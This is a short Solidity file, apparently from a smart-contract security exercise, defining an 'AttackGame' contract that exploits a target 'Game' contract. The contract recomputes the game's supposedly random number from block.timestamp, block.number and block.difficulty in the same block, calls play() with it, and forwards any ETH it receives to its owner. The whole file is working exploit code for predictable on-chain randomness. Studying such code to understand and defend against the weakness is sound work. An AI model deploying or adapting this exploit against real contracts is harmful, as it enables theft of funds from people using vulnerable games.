// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Game} from "./Game.sol";

contract AttackGame {
    Game gameContract;
    address payable owner;

    constructor(address _game) payable {
        owner = payable(msg.sender);
        gameContract = Game(_game);
    }

    function attack() external {
        uint256 number = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        gameContract.play(number);
    }

    receive() external payable {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "can't send the ETH");
    }
}
